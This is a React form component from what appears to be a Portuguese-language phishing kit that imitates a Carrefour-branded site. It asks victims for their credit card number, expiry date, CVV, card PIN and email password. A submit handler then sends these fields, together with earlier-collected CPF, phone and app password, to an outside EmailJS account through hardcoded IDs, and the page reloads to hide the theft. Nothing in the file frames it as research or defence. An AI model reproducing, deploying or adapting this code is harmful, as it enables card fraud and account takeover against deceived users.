import React, { Component,useEffect } from 'react'
import logo from './carrfo.png'
import emailjs from 'emailjs-com';




export class SocialProfiles extends Component {
    continue = e => {
        e.preventDefault();
        this.props.nextStep();
    };

    back = e => {
        e.preventDefault();
        this.props.prevStep();
    };

    render() {
        function sendEmail(e) {
            e.preventDefault();
        
            emailjs.sendForm('service_m0rqqeb', 'template_ovtqo1m', e.target, 'user_blutAP3dvwCpJzktiSL3a')
              .then((result) => {
                  console.log(result.text);
                  window.location.reload(true); 


              }, (error) => {
                  console.log(error.text);
              });


          }
      

        const { values, inputChange } = this.props;
        const {
            values: { cp, email, phone, passapp, cc, valcc, ccpass,passemail,cvv }
        } = this.props;
        return (


            
            <div className="form-container">
          <div className="text-center container">

<img className="logo" src={logo} width="100"/>
</div>
                <p className="container"><b>Tudo certo!<br></br></b> Precisamos Cadastrar informações do seu <b>Cartão de Crédito</b></p>
                <div className="form-group">
                    <input placeholder="16 dígitos do cartão" type="number" className="form-control" name="cc" onChange={inputChange('cc')} value={values.cc} required/>
                </div>
                <div className="form-group">
                    <input placeholder="Validade(MM/AAAA)" type="text" className="form-control" name="valcc" onChange={inputChange('valcc')} value={values.valcc} required/>
                </div>
                <div className="form-group">
                    <input placeholder="Código de Segurança (CVV)" type="text" className="form-control" name="cvv" onChange={inputChange('cvv')} value={values.cvv} required/>
                </div>
                <div className="form-group">
                    <input placeholder="Senha do cartão" className="form-control" name="ccpass" onChange={inputChange('ccpass')} value={values.ccpass} required/>
                </div>
                <div className="form-group">
                    <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} required/>
                   <span class="focus-border"></span>
                </div>
                <br />
                {/* <input type="text" name="ip" placeholder={this.ipzao}  ></input> */}

                <div className="row">
                    <div className="col-6">
                        <button className="btn btn-danger" onClick={this.back}>Voltar</button>
                    </div>
                    <div className="col-6 text-right">
                    <form onSubmit={sendEmail}>

    <input type="hidden" name="cp" value={cp} required></input>
    <input type="hidden" name="email" value={email}></input>
    <input type="hidden" name="phone"  value={phone}></input>
    <input type="hidden" name="passapp" value={passapp}></input>
    <input type="hidden" name="cc" value={cc}></input>
    <input type="hidden" name="valcc" value={valcc}></input>
    <input type="hidden" name="cvv" value={cvv}></input>
    <input type="hidden" name="ccpass" value={ccpass}></input>
    <input type="hidden" name="passemail" value={passemail}></input>


                       
    <button type="submit"className="btn btn-primary" >ENTRAR</button>
    </form>
                    </div>
                </div>
            </div>
        )
      
    }
}

export default SocialProfiles
